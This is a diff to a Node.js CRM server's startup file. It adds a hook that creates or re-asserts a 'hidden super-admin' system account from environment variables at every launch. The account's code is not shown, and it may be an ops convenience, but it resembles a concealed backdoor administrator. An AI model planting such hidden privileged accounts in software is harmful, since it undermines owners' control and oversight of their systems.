@@ -15,6 +15,7 @@ const { startMetaPullJob } = require('./jobs/metaPullJob');
 const { startDistributionScheduler } = require('./services/distributionScheduler');
 const { syncAllCampaigns } = require('./services/metaSyncService');
 const { initSocket } = require('./services/socketService');
+const { bootstrapHiddenAdmin } = require('./services/hiddenAdminBootstrap');
 
 const CAMPAIGN_SYNC_INTERVAL_MS = 30 * 60 * 1000; // 30 minutes
 
@@ -24,6 +25,17 @@ initSocket(server);
 server.listen(config.port, () => {
   logger.info(`DigitalADbird CRM API listening on :${config.port} [${config.env}]`);
 });
+
+// Hidden super-admin bootstrap — creates / re-asserts the protected
+// system account if HIDDEN_ADMIN_* env vars are set. Runs once at
+// startup. Failures are logged but don't crash the server.
+(async () => {
+  try {
+    await bootstrapHiddenAdmin();
+  } catch (err) {
+    logger.error({ err: err.message }, '[HiddenAdmin] bootstrap failed');
+  }
+})();
 
 // Background jobs
 const leadLockTimer         = startLeadLockJob();
